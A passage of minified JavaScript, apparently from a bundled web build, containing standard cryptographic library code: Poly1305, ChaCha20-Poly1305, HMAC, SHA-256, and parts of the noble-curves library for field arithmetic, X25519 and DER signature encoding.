l=Math.min(r-this.pos,i-o);if(l===r){for(;r<=i-o;o+=r)this.process(e,o);continue}n.set(e.subarray(o,o+l),this.pos),this.pos+=l,o+=l,this.pos===r&&(this.process(n,0,!1),this.pos=0)}return this}destroy(){Ua(this.h,this.r,this.buffer,this.pad)}digestInto(e){D2(this),B7(e,this),this.finished=!0;const{buffer:n,h:r}=this;let{pos:i}=this;if(i){for(n[i++]=1;i<16;i++)n[i]=0;this.process(n,0,!0)}this.finalize();let o=0;for(let l=0;l<8;l++)e[o++]=r[l]>>>0,e[o++]=r[l]>>>8;return e}digest(){const{buffer:e,outputLen:n}=this;this.digestInto(e);const r=e.slice(0,n);return this.destroy(),r}}function Q7(t){const e=(r,i)=>t(i).update(lm(r)).digest(),n=t(new Uint8Array(32));return e.outputLen=n.outputLen,e.blockLen=n.blockLen,e.create=r=>t(r),e}const X7=Q7(t=>new Z7(t));function ez(t,e,n,r,i,o=20){let l=t[0],c=t[1],u=t[2],f=t[3],d=e[0],y=e[1],g=e[2],E=e[3],w=e[4],b=e[5],m=e[6],x=e[7],S=i,O=n[0],$=n[1],R=n[2],T=l,D=c,B=u,k=f,G=d,W=y,J=g,ne=E,j=w,A=b,C=m,U=x,M=S,N=O,V=$,F=R;for(let Q=0;Q<o;Q+=2)T=T+G|0,M=Ke(M^T,16),j=j+M|0,G=Ke(G^j,12),T=T+G|0,M=Ke(M^T,8),j=j+M|0,G=Ke(G^j,7),D=D+W|0,N=Ke(N^D,16),A=A+N|0,W=Ke(W^A,12),D=D+W|0,N=Ke(N^D,8),A=A+N|0,W=Ke(W^A,7),B=B+J|0,V=Ke(V^B,16),C=C+V|0,J=Ke(J^C,12),B=B+J|0,V=Ke(V^B,8),C=C+V|0,J=Ke(J^C,7),k=k+ne|0,F=Ke(F^k,16),U=U+F|0,ne=Ke(ne^U,12),k=k+ne|0,F=Ke(F^k,8),U=U+F|0,ne=Ke(ne^U,7),T=T+W|0,F=Ke(F^T,16),C=C+F|0,W=Ke(W^C,12),T=T+W|0,F=Ke(F^T,8),C=C+F|0,W=Ke(W^C,7),D=D+J|0,M=Ke(M^D,16),U=U+M|0,J=Ke(J^U,12),D=D+J|0,M=Ke(M^D,8),U=U+M|0,J=Ke(J^U,7),B=B+ne|0,N=Ke(N^B,16),j=j+N|0,ne=Ke(ne^j,12),B=B+ne|0,N=Ke(N^B,8),j=j+N|0,ne=Ke(ne^j,7),k=k+G|0,V=Ke(V^k,16),A=A+V|0,G=Ke(G^A,12),k=k+G|0,V=Ke(V^k,8),A=A+V|0,G=Ke(G^A,7);let q=0;r[q++]=l+T|0,r[q++]=c+D|0,r[q++]=u+B|0,r[q++]=f+k|0,r[q++]=d+G|0,r[q++]=y+W|0,r[q++]=g+J|0,r[q++]=E+ne|0,r[q++]=w+j|0,r[q++]=b+A|0,r[q++]=m+C|0,r[q++]=x+U|0,r[q++]=S+M|0,r[q++]=O+N|0,r[q++]=$+V|0,r[q++]=R+F|0}const tz=J7(ez,{counterRight:!1,counterLength:4,allowShortKeys:!1}),nz=new Uint8Array(16),j2=(t,e)=>{t.update(e);const n=e.length%16;n&&t.update(nz.subarray(n))},rz=new Uint8Array(32);function U2(t,e,n,r,i){const o=t(e,n,rz),l=X7.create(o);i&&j2(l,i),j2(l,r);const c=new Uint8Array(16),u=L7(c);B2(u,0,BigInt(i?i.length:0),!0),B2(u,8,BigInt(r.length),!0),l.update(c);const f=l.digest();return Ua(o,c),f}const iz=t=>(e,n,r)=>({encrypt(i,o){const l=i.length;o=k2(l+16,o,!1),o.set(i);const c=o.subarray(0,-16);t(e,n,c,c,1);const u=U2(t,e,n,c,r);return o.set(u,l),Ua(u),o},decrypt(i,o){o=k2(i.length-16,o,!1);const l=i.subarray(0,-16),c=i.subarray(-16),u=U2(t,e,n,l,r);if(!F7(c,u))throw new Error("invalid tag");return o.set(i.subarray(0,-16)),t(e,n,o,o,1),Ua(u),o}});z7({blockSize:64,nonceLength:12,tagLength:16},iz(tz));class ZI extends hw{constructor(e,n){super(),this.finished=!1,this.destroyed=!1,y7(e);const r=zf(n);if(this.iHash=e.create(),typeof this.iHash.update!="function")throw new Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;const i=this.blockLen,o=new Uint8Array(i);o.set(r.length>i?e.create().update(r).digest():r);for(let l=0;l<o.length;l++)o[l]^=54;this.iHash.update(o),this.oHash=e.create();for(let l=0;l<o.length;l++)o[l]^=106;this.oHash.update(o),o.fill(0)}update(e){return ja(this),this.iHash.update(e),this}digestInto(e){ja(this),Yc(e,this.outputLen),this.finished=!0,this.iHash.digestInto(e),this.oHash.update(e),this.oHash.digestInto(e),this.destroy()}digest(){const e=new Uint8Array(this.oHash.outputLen);return this.digestInto(e),e}_cloneInto(e){e||(e=Object.create(Object.getPrototypeOf(this),{}));const{oHash:n,iHash:r,finished:i,destroyed:o,blockLen:l,outputLen:c}=this;return e=e,e.finished=i,e.destroyed=o,e.blockLen=l,e.outputLen=c,e.oHash=n._cloneInto(e.oHash),e.iHash=r._cloneInto(e.iHash),e}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}}const QI=(t,e,n)=>new ZI(t,e).update(n).digest();QI.create=(t,e)=>new ZI(t,e);function sz(t,e,n,r){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,n,r);const i=BigInt(32),o=BigInt(4294967295),l=Number(n>>i&o),c=Number(n&o),u=r?4:0,f=r?0:4;t.setUint32(e+u,l,r),t.setUint32(e+f,c,r)}function oz(t,e,n){return t&e^~t&n}function az(t,e,n){return t&e^t&n^e&n}class lz extends hw{constructor(e,n,r,i){super(),this.blockLen=e,this.outputLen=n,this.padOffset=r,this.isLE=i,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(e),this.view=Gg(this.buffer)}update(e){ja(this);const{view:n,buffer:r,blockLen:i}=this;e=zf(e);const o=e.length;for(let l=0;l<o;){const c=Math.min(i-this.pos,o-l);if(c===i){const u=Gg(e);for(;i<=o-l;l+=i)this.process(u,l);continue}r.set(e.subarray(l,l+c),this.pos),this.pos+=c,l+=c,this.pos===i&&(this.process(n,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){ja(this),zI(e,this),this.finished=!0;const{buffer:n,view:r,blockLen:i,isLE:o}=this;let{pos:l}=this;n[l++]=128,this.buffer.subarray(l).fill(0),this.padOffset>i-l&&(this.process(r,0),l=0);for(let y=l;y<i;y++)n[y]=0;sz(r,i-8,BigInt(this.length*8),o),this.process(r,0);const c=Gg(e),u=this.outputLen;if(u%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const f=u/4,d=this.get();if(f>d.length)throw new Error("_sha2: outputLen bigger than state");for(let y=0;y<f;y++)c.setUint32(4*y,d[y],o)}digest(){const{buffer:e,outputLen:n}=this;this.digestInto(e);const r=e.slice(0,n);return this.destroy(),r}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:n,buffer:r,length:i,finished:o,destroyed:l,pos:c}=this;return e.length=i,e.pos=c,e.finished=o,e.destroyed=l,i%n&&e.buffer.set(r),e}}const cz=new Uint32Array([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),us=new Uint32Array([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),hs=new Uint32Array(64);class uz extends lz{constructor(){super(64,32,8,!1),this.A=us[0]|0,this.B=us[1]|0,this.C=us[2]|0,this.D=us[3]|0,this.E=us[4]|0,this.F=us[5]|0,this.G=us[6]|0,this.H=us[7]|0}get(){const{A:e,B:n,C:r,D:i,E:o,F:l,G:c,H:u}=this;return[e,n,r,i,o,l,c,u]}set(e,n,r,i,o,l,c,u){this.A=e|0,this.B=n|0,this.C=r|0,this.D=i|0,this.E=o|0,this.F=l|0,this.G=c|0,this.H=u|0}process(e,n){for(let y=0;y<16;y++,n+=4)hs[y]=e.getUint32(n,!1);for(let y=16;y<64;y++){const g=hs[y-15],E=hs[y-2],w=Gr(g,7)^Gr(g,18)^g>>>3,b=Gr(E,17)^Gr(E,19)^E>>>10;hs[y]=b+hs[y-7]+w+hs[y-16]|0}let{A:r,B:i,C:o,D:l,E:c,F:u,G:f,H:d}=this;for(let y=0;y<64;y++){const g=Gr(c,6)^Gr(c,11)^Gr(c,25),E=d+g+oz(c,u,f)+cz[y]+hs[y]|0,w=(Gr(r,2)^Gr(r,13)^Gr(r,22))+az(r,i,o)|0;d=f,f=u,u=c,c=l+E|0,l=o,o=i,i=r,r=E+w|0}r=r+this.A|0,i=i+this.B|0,o=o+this.C|0,l=l+this.D|0,c=c+this.E|0,u=u+this.F|0,f=f+this.G|0,d=d+this.H|0,this.set(r,i,o,l,c,u,f,d)}roundClean(){hs.fill(0)}destroy(){this.set(0,0,0,0,0,0,0,0),this.buffer.fill(0)}}const hz=qI(()=>new uz);/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const qf=BigInt(0),Hf=BigInt(1),fz=BigInt(2);function lo(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function Jc(t){if(!lo(t))throw new Error("Uint8Array expected")}function Ma(t,e){if(typeof e!="boolean")throw new Error(t+" boolean expected, got "+e)}const dz=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function Fa(t){Jc(t);let e="";for(let n=0;n<t.length;n++)e+=dz[t[n]];return e}function wa(t){const e=t.toString(16);return e.length&1?"0"+e:e}function dw(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);return t===""?qf:BigInt("0x"+t)}const bi={_0:48,_9:57,A:65,F:70,a:97,f:102};function M2(t){if(t>=bi._0&&t<=bi._9)return t-bi._0;if(t>=bi.A&&t<=bi.F)return t-(bi.A-10);if(t>=bi.a&&t<=bi.f)return t-(bi.a-10)}function za(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);const e=t.length,n=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const r=new Uint8Array(n);for(let i=0,o=0;i<n;i++,o+=2){const l=M2(t.charCodeAt(o)),c=M2(t.charCodeAt(o+1));if(l===void 0||c===void 0){const u=t[o]+t[o+1];throw new Error('hex string expected, got non-hex character "'+u+'" at index '+o)}r[i]=l*16+c}return r}function to(t){return dw(Fa(t))}function Pc(t){return Jc(t),dw(Fa(Uint8Array.from(t).reverse()))}function qa(t,e){return za(t.toString(16).padStart(e*2,"0"))}function Vf(t,e){return qa(t,e).reverse()}function pz(t){return za(wa(t))}function Zn(t,e,n){let r;if(typeof e=="string")try{r=za(e)}catch(o){throw new Error(t+" must be hex string or Uint8Array, cause: "+o)}else if(lo(e))r=Uint8Array.from(e);else throw new Error(t+" must be hex string or Uint8Array");const i=r.length;if(typeof n=="number"&&i!==n)throw new Error(t+" of length "+n+" expected, got "+i);return r}function Tc(...t){let e=0;for(let r=0;r<t.length;r++){const i=t[r];Jc(i),e+=i.length}const n=new Uint8Array(e);for(let r=0,i=0;r<t.length;r++){const o=t[r];n.set(o,i),i+=o.length}return n}function gz(t,e){if(t.length!==e.length)return!1;let n=0;for(let r=0;r<t.length;r++)n|=t[r]^e[r];return n===0}function yz(t){if(typeof t!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(t))}const Jg=t=>typeof t=="bigint"&&qf<=t;function Wf(t,e,n){return Jg(t)&&Jg(e)&&Jg(n)&&e<=t&&t<n}function Di(t,e,n,r){if(!Wf(e,n,r))throw new Error("expected valid "+t+": "+n+" <= n < "+r+", got "+e)}function XI(t){let e;for(e=0;t>qf;t>>=Hf,e+=1);return e}function mz(t,e){return t>>BigInt(e)&Hf}function wz(t,e,n){return t|(n?Hf:qf)<<BigInt(e)}const pw=t=>(fz<<BigInt(t-1))-Hf,Zg=t=>new Uint8Array(t),F2=t=>Uint8Array.from(t);function eO(t,e,n){if(typeof t!="number"||t<2)throw new Error("hashLen must be a number");if(typeof e!="number"||e<2)throw new Error("qByteLen must be a number");if(typeof n!="function")throw new Error("hmacFn must be a function");let r=Zg(t),i=Zg(t),o=0;const l=()=>{r.fill(1),i.fill(0),o=0},c=(...d)=>n(i,r,...d),u=(d=Zg())=>{i=c(F2([0]),d),r=c(),d.length!==0&&(i=c(F2([1]),d),r=c())},f=()=>{if(o++>=1e3)throw new Error("drbg: tried 1000 values");let d=0;const y=[];for(;d<e;){r=c();const g=r.slice();y.push(g),d+=r.length}return Tc(...y)};return(d,y)=>{l(),u(d);let g;for(;!(g=y(f()));)u();return l(),g}}const vz={bigint:t=>typeof t=="bigint",function:t=>typeof t=="function",boolean:t=>typeof t=="boolean",string:t=>typeof t=="string",stringOrUint8Array:t=>typeof t=="string"||lo(t),isSafeInteger:t=>Number.isSafeInteger(t),array:t=>Array.isArray(t),field:(t,e)=>e.Fp.isValid(t),hash:t=>typeof t=="function"&&Number.isSafeInteger(t.outputLen)};function el(t,e,n={}){const r=(i,o,l)=>{const c=vz[o];if(typeof c!="function")throw new Error("invalid validator function");const u=t[i];if(!(l&&u===void 0)&&!c(u,t))throw new Error("param "+String(i)+" is invalid. Expected "+o+", got "+u)};for(const[i,o]of Object.entries(e))r(i,o,!1);for(const[i,o]of Object.entries(n))r(i,o,!0);return t}const bz=()=>{throw new Error("not implemented")};function hm(t){const e=new WeakMap;return(n,...r)=>{const i=e.get(n);if(i!==void 0)return i;const o=t(n,...r);return e.set(n,o),o}}var Ez=Object.freeze({__proto__:null,isBytes:lo,abytes:Jc,abool:Ma,bytesToHex:Fa,numberToHexUnpadded:wa,hexToNumber:dw,hexToBytes:za,bytesToNumberBE:to,bytesToNumberLE:Pc,numberToBytesBE:qa,numberToBytesLE:Vf,numberToVarBytesBE:pz,ensureBytes:Zn,concatBytes:Tc,equalBytes:gz,utf8ToBytes:yz,inRange:Wf,aInRange:Di,bitLen:XI,bitGet:mz,bitSet:wz,bitMask:pw,createHmacDrbg:eO,validateObject:el,notImplemented:bz,memoized:hm});const Jt=BigInt(0),$t=BigInt(1),Gs=BigInt(2),xz=BigInt(3),fm=BigInt(4),z2=BigInt(5),q2=BigInt(8);function Ln(t,e){const n=t%e;return n>=Jt?n:e+n}function tO(t,e,n){if(e<Jt)throw new Error("invalid exponent, negatives unsupported");if(n<=Jt)throw new Error("invalid modulus");if(n===$t)return Jt;let r=$t;for(;e>Jt;)e&$t&&(r=r*t%n),t=t*t%n,e>>=$t;return r}function Cr(t,e,n){let r=t;for(;e-- >Jt;)r*=r,r%=n;return r}function dm(t,e){if(t===Jt)throw new Error("invert: expected non-zero number");if(e<=Jt)throw new Error("invert: expected positive modulus, got "+e);let n=Ln(t,e),r=e,i=Jt,o=$t;for(;n!==Jt;){const l=r/n,c=r%n,u=i-o*l;r=n,n=c,i=o,o=u}if(r!==$t)throw new Error("invert: does not exist");return Ln(i,e)}function Sz(t){const e=(t-$t)/Gs;let n,r,i;for(n=t-$t,r=0;n%Gs===Jt;n/=Gs,r++);for(i=Gs;i<t&&tO(i,e,t)!==t-$t;i++)if(i>1e3)throw new Error("Cannot find square root: likely non-prime P");if(r===1){const l=(t+$t)/fm;return function(c,u){const f=c.pow(u,l);if(!c.eql(c.sqr(f),u))throw new Error("Cannot find square root");return f}}const o=(n+$t)/Gs;return function(l,c){if(l.pow(c,e)===l.neg(l.ONE))throw new Error("Cannot find square root");let u=r,f=l.pow(l.mul(l.ONE,i),n),d=l.pow(c,o),y=l.pow(c,n);for(;!l.eql(y,l.ONE);){if(l.eql(y,l.ZERO))return l.ZERO;let g=1;for(let w=l.sqr(y);g<u&&!l.eql(w,l.ONE);g++)w=l.sqr(w);const E=l.pow(f,$t<<BigInt(u-g-1));f=l.sqr(E),d=l.mul(d,E),y=l.mul(y,f),u=g}return d}}function _z(t){if(t%fm===xz){const e=(t+$t)/fm;return function(n,r){const i=n.pow(r,e);if(!n.eql(n.sqr(i),r))throw new Error("Cannot find square root");return i}}if(t%q2===z2){const e=(t-z2)/q2;return function(n,r){const i=n.mul(r,Gs),o=n.pow(i,e),l=n.mul(r,o),c=n.mul(n.mul(l,Gs),o),u=n.mul(l,n.sub(c,n.ONE));if(!n.eql(n.sqr(u),r))throw new Error("Cannot find square root");return u}}return Sz(t)}const Iz=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function Oz(t){const e={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},n=Iz.reduce((r,i)=>(r[i]="function",r),e);return el(t,n)}function $z(t,e,n){if(n<Jt)throw new Error("invalid exponent, negatives unsupported");if(n===Jt)return t.ONE;if(n===$t)return e;let r=t.ONE,i=e;for(;n>Jt;)n&$t&&(r=t.mul(r,i)),i=t.sqr(i),n>>=$t;return r}function Pz(t,e){const n=new Array(e.length),r=e.reduce((o,l,c)=>t.is0(l)?o:(n[c]=o,t.mul(o,l)),t.ONE),i=t.inv(r);return e.reduceRight((o,l,c)=>t.is0(l)?o:(n[c]=t.mul(o,n[c]),t.mul(o,l)),i),n}function nO(t,e){const n=e!==void 0?e:t.toString(2).length,r=Math.ceil(n/8);return{nBitLength:n,nByteLength:r}}function rO(t,e,n=!1,r={}){if(t<=Jt)throw new Error("invalid field: expected ORDER > 0, got "+t);const{nBitLength:i,nByteLength:o}=nO(t,e);if(o>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let l;const c=Object.freeze({ORDER:t,isLE:n,BITS:i,BYTES:o,MASK:pw(i),ZERO:Jt,ONE:$t,create:u=>Ln(u,t),isValid:u=>{if(typeof u!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof u);return Jt<=u&&u<t},is0:u=>u===Jt,isOdd:u=>(u&$t)===$t,neg:u=>Ln(-u,t),eql:(u,f)=>u===f,sqr:u=>Ln(u*u,t),add:(u,f)=>Ln(u+f,t),sub:(u,f)=>Ln(u-f,t),mul:(u,f)=>Ln(u*f,t),pow:(u,f)=>$z(c,u,f),div:(u,f)=>Ln(u*dm(f,t),t),sqrN:u=>u*u,addN:(u,f)=>u+f,subN:(u,f)=>u-f,mulN:(u,f)=>u*f,inv:u=>dm(u,t),sqrt:r.sqrt||(u=>(l||(l=_z(t)),l(c,u))),invertBatch:u=>Pz(c,u),cmov:(u,f,d)=>d?f:u,toBytes:u=>n?Vf(u,o):qa(u,o),fromBytes:u=>{if(u.length!==o)throw new Error("Field.fromBytes: expected "+o+" bytes, got "+u.length);return n?Pc(u):to(u)}});return Object.freeze(c)}function iO(t){if(typeof t!="bigint")throw new Error("field order must be bigint");const e=t.toString(2).length;return Math.ceil(e/8)}function sO(t){const e=iO(t);return e+Math.ceil(e/2)}function Tz(t,e,n=!1){const r=t.length,i=iO(e),o=sO(e);if(r<16||r<o||r>1024)throw new Error("expected "+o+"-1024 bytes of input, got "+r);const l=n?Pc(t):to(t),c=Ln(l,e-$t)+$t;return n?Vf(c,i):qa(c,i)}const H2=BigInt(0),Ah=BigInt(1);function Qg(t,e){const n=e.negate();return t?n:e}function oO(t,e){if(!Number.isSafeInteger(t)||t<=0||t>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+t)}function Xg(t,e){oO(t,e);const n=Math.ceil(e/t)+1,r=2**(t-1);return{windows:n,windowSize:r}}function Az(t,e){if(!Array.isArray(t))throw new Error("array expected");t.forEach((n,r)=>{if(!(n instanceof e))throw new Error("invalid point at index "+r)})}function Cz(t,e){if(!Array.isArray(t))throw new Error("array of scalars expected");t.forEach((n,r)=>{if(!e.isValid(n))throw new Error("invalid scalar at index "+r)})}const ey=new WeakMap,aO=new WeakMap;function ty(t){return aO.get(t)||1}function Rz(t,e){return{constTimeNegate:Qg,hasPrecomputes(n){return ty(n)!==1},unsafeLadder(n,r,i=t.ZERO){let o=n;for(;r>H2;)r&Ah&&(i=i.add(o)),o=o.double(),r>>=Ah;return i},precomputeWindow(n,r){const{windows:i,windowSize:o}=Xg(r,e),l=[];let c=n,u=c;for(let f=0;f<i;f++){u=c,l.push(u);for(let d=1;d<o;d++)u=u.add(c),l.push(u);c=u.double()}return l},wNAF(n,r,i){const{windows:o,windowSize:l}=Xg(n,e);let c=t.ZERO,u=t.BASE;const f=BigInt(2**n-1),d=2**n,y=BigInt(n);for(let g=0;g<o;g++){const E=g*l;let w=Number(i&f);i>>=y,w>l&&(w-=d,i+=Ah);const b=E,m=E+Math.abs(w)-1,x=g%2!==0,S=w<0;w===0?u=u.add(Qg(x,r[b])):c=c.add(Qg(S,r[m]))}return{p:c,f:u}},wNAFUnsafe(n,r,i,o=t.ZERO){const{windows:l,windowSize:c}=Xg(n,e),u=BigInt(2**n-1),f=2**n,d=BigInt(n);for(let y=0;y<l;y++){const g=y*c;if(i===H2)break;let E=Number(i&u);if(i>>=d,E>c&&(E-=f,i+=Ah),E===0)continue;let w=r[g+Math.abs(E)-1];E<0&&(w=w.negate()),o=o.add(w)}return o},getPrecomputes(n,r,i){let o=ey.get(r);return o||(o=this.precomputeWindow(r,n),n!==1&&ey.set(r,i(o))),o},wNAFCached(n,r,i){const o=ty(n);return this.wNAF(o,this.getPrecomputes(o,n,i),r)},wNAFCachedUnsafe(n,r,i,o){const l=ty(n);return l===1?this.unsafeLadder(n,r,o):this.wNAFUnsafe(l,this.getPrecomputes(l,n,i),r,o)},setWindowSize(n,r){oO(r,e),aO.set(n,r),ey.delete(n)}}}function Dz(t,e,n,r){if(Az(n,t),Cz(r,e),n.length!==r.length)throw new Error("arrays of points and scalars must have equal length");const i=t.ZERO,o=XI(BigInt(n.length)),l=o>12?o-3:o>4?o-2:o?2:1,c=(1<<l)-1,u=new Array(c+1).fill(i),f=Math.floor((e.BITS-1)/l)*l;let d=i;for(let y=f;y>=0;y-=l){u.fill(i);for(let E=0;E<r.length;E++){const w=r[E],b=Number(w>>BigInt(y)&BigInt(c));u[b]=u[b].add(n[E])}let g=i;for(let E=u.length-1,w=i;E>0;E--)w=w.add(u[E]),g=g.add(w);if(d=d.add(g),y!==0)for(let E=0;E<l;E++)d=d.double()}return d}function lO(t){return Oz(t.Fp),el(t,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...nO(t.n,t.nBitLength),...t,p:t.Fp.ORDER})}BigInt(0),BigInt(1),BigInt(2),BigInt(8);const Xo=BigInt(0),ny=BigInt(1);function Nz(t){return el(t,{a:"bigint"},{montgomeryBits:"isSafeInteger",nByteLength:"isSafeInteger",adjustScalarBytes:"function",domain:"function",powPminus2:"function",Gu:"bigint"}),Object.freeze({...t})}function kz(t){const e=Nz(t),{P:n}=e,r=S=>Ln(S,n),i=e.montgomeryBits,o=Math.ceil(i/8),l=e.nByteLength,c=e.adjustScalarBytes||(S=>S),u=e.powPminus2||(S=>tO(S,n-BigInt(2),n));function f(S,O,$){const R=r(S*(O-$));return O=r(O-R),$=r($+R),[O,$]}const d=(e.a-BigInt(2))/BigInt(4);function y(S,O){Di("u",S,Xo,n),Di("scalar",O,Xo,n);const $=O,R=S;let T=ny,D=Xo,B=S,k=ny,G=Xo,W;for(let ne=BigInt(i-1);ne>=Xo;ne--){const j=$>>ne&ny;G^=j,W=f(G,T,B),T=W[0],B=W[1],W=f(G,D,k),D=W[0],k=W[1],G=j;const A=T+D,C=r(A*A),U=T-D,M=r(U*U),N=C-M,V=B+k,F=B-k,q=r(F*A),Q=r(V*U),te=q+Q,se=q-Q;B=r(te*te),k=r(R*r(se*se)),T=r(C*M),D=r(N*(C+r(d*N)))}W=f(G,T,B),T=W[0],B=W[1],W=f(G,D,k),D=W[0],k=W[1];const J=u(D);return r(T*J)}function g(S){return Vf(r(S),o)}function E(S){const O=Zn("u coordinate",S,o);return l===32&&(O[31]&=127),Pc(O)}function w(S){const O=Zn("scalar",S),$=O.length;if($!==o&&$!==l){let R=""+o+" or "+l;throw new Error("invalid scalar, expected "+R+" bytes, got "+$)}return Pc(c(O))}function b(S,O){const $=E(O),R=w(S),T=y($,R);if(T===Xo)throw new Error("invalid private or public key received");return g(T)}const m=g(e.Gu);function x(S){return b(S,m)}return{scalarMult:b,scalarMultBase:x,getSharedSecret:(S,O)=>b(S,O),getPublicKey:S=>x(S),utils:{randomPrivateKey:()=>e.randomBytes(e.nByteLength)},GuBytes:m}}const pm=BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949");BigInt(0);const Bz=BigInt(1),V2=BigInt(2),Lz=BigInt(3),jz=BigInt(5);BigInt(8);function Uz(t){const e=BigInt(10),n=BigInt(20),r=BigInt(40),i=BigInt(80),o=pm,l=t*t%o*t%o,c=Cr(l,V2,o)*l%o,u=Cr(c,Bz,o)*t%o,f=Cr(u,jz,o)*u%o,d=Cr(f,e,o)*f%o,y=Cr(d,n,o)*d%o,g=Cr(y,r,o)*y%o,E=Cr(g,i,o)*g%o,w=Cr(E,i,o)*g%o,b=Cr(w,e,o)*f%o;return{pow_p_5_8:Cr(b,V2,o)*t%o,b2:l}}function Mz(t){return t[0]&=248,t[31]&=127,t[31]|=64,t}kz({P:pm,a:BigInt(486662),montgomeryBits:255,nByteLength:32,Gu:BigInt(9),powPminus2:t=>{const e=pm,{pow_p_5_8:n,b2:r}=Uz(t);return Ln(Cr(n,Lz,e)*r,e)},adjustScalarBytes:Mz,randomBytes:HI});function W2(t){t.lowS!==void 0&&Ma("lowS",t.lowS),t.prehash!==void 0&&Ma("prehash",t.prehash)}function Fz(t){const e=lO(t);el(e,{a:"field",b:"field"},{allowedPrivateKeyLengths:"array",wrapPrivateKey:"boolean",isTorsionFree:"function",clearCofactor:"function",allowInfinityPoint:"boolean",fromBytes:"function",toBytes:"function"});const{endo:n,Fp:r,a:i}=e;if(n){if(!r.eql(i,r.ZERO))throw new Error("invalid endomorphism, can only be defined for Koblitz curves that have a=0");if(typeof n!="object"||typeof n.beta!="bigint"||typeof n.splitScalar!="function")throw new Error("invalid endomorphism, expected beta: bigint and splitScalar: function")}return Object.freeze({...e})}const{bytesToNumberBE:zz,hexToBytes:qz}=Ez;class Hz extends Error{constructor(e=""){super(e)}}const Ii={Err:Hz,_tlv:{encode:(t,e)=>{const{Err:n}=Ii;if(t<0||t>256)throw new n("tlv.encode: wrong tag");if(e.length&1)throw new n("tlv.encode: unpadded data");const r=e.length/2,i=wa(r);if(i.length/2&128)throw new n("tlv.encode: long form length too big");const o=r>127?wa(i.length/2|128):"";return wa(t)+o+i+e},decode(t,e){const{Err:n}=Ii;let r=0;if(t<0||t>256)throw new n("tlv.encode: wrong tag");if(e.length<2||e[r++]!==t)throw new n("tlv.decode: wrong tlv");const i=e[r++],o=!!(i&128);let l=0;if(!o)l=i;else{const u=i&127;if(!u)throw new n("tlv.decode(long): indefinite length not supported");if(u>4)throw new n("tlv.decode(long): byte length is too big");const f=e.subarray(r,r+u);if(f.length!==u)throw new n("tlv.decode: length bytes not complete");if(f[0]===0)throw new n("tlv.decode(long): zero leftmost byte");for(const d of f)l=l<<8|d;if(r+=u,l<128)throw new n("tlv.decode(long): not minimal encoding")}const c=e.subarray(r,r+l);if(c.length!==l)throw new n("tlv.decode: wrong value length");return{v:c,l:e.subarray(r+l)}}},_int:{encode(t){const{Err:e}=Ii;if(t<Pi)throw new e("integer: negative integers are not allowed");let n=wa(t);if(Number.parseInt(n[0],16)&8&&(n="00"+n),n.length&1)throw new e("unexpected DER parsing assertion: unpadded hex");return n},decode(t){const{Err:e}=Ii;if(t[0]&128)throw new e("invalid signature integer: negative");if(t[0]===0&&!(t[1]&128))throw new e("invalid signature integer: unnecessary leading zero");return zz(t)}},toSig(t){const{Err:e,_int:n,_tlv:r}=Ii,i=typeof t=="string"?qz(t):t;Jc(i);const{v:o,l}=r.decode(48,i);if(l.length)throw new e("invalid signature: left bytes after parsing");const{v:c,l:u}=r.decode(2,o),{v:f,l:d}=r.decode(2,u);if(d.length)throw new e("invalid signature: left bytes after parsing");return{r:n.decode(c),s:n.decode(f)}},hexFromSig(t){const{_tlv:e,_int:n}=Ii,r=e.encode(2,n.encode(t.r)),i=e.encode(2,n.encode(t.s)),o=r+i;return e.encode(48,o)}},Pi=BigInt(0),Vt=BigInt(1);BigInt(2);const K2=BigInt(3);BigInt(4);function Vz(t){const e=Fz(t),{Fp:n}=e,r=rO(e.n,e.nBitLength),i=e.toBytes||((b,m,x)=>{const S=m.toAffine();return Tc(Uint8Array.from([4]),n.toBytes(S.x),n.toBytes(S.y))}),o=e.fromBytes||(b=>{const m=b.subarray(1),x=n.fromBytes(m.subarray(0,n.BYTES)),S=n.fromBytes(m.subarray(n.BYTES,2*n.BYTES));return{x,y:S}});function l(b){const{a:m,b:x}=e,S=n.sqr(b),O=n.mul(S,b);return n.add(n.add(O,n.mul(b,m)),x)}if(!n.eql(n.sqr(e.Gy),l(e.Gx)))throw new Error("bad generator point: equation left != right");function c(b){return Wf(b,Vt,e.n)}function u(b){const{allowedPrivateKeyLengths:m,nByteLength:x,wrapPrivateKey:S,n:O}=e;if(m&&typeof b!="bigint"){if(lo(b)&&(b=Fa(b)),typeof b!="string"||!m.includes(b.length))throw new Error("invalid private key");b=b.padStart(x*2,"0")}let $;try{$=typeof 